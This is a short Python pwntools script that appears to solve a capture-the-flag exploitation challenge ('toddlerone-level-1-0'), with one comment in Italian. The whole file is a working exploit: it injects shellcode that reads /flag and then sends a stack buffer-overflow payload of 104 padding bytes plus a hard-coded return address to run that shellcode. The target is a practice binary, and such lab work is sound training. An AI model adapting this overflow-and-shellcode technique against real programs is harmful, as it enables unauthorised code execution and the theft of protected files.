#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'

elf = ELF('/challenge/toddlerone-level-1-0')

io = elf.process()
SHELLCODE = asm(shellcraft.cat('/flag'))
io.sendline(SHELLCODE)

PAYLOAD =  b'A' * 104 + b'\x00\xd0\x9c\x15\x00\x00\x00\x00'

# Invio lunghezza e payload e leggo la flag
io.sendline(f"{len(PAYLOAD)}".encode())
io.sendline(PAYLOAD)
io.interactive()
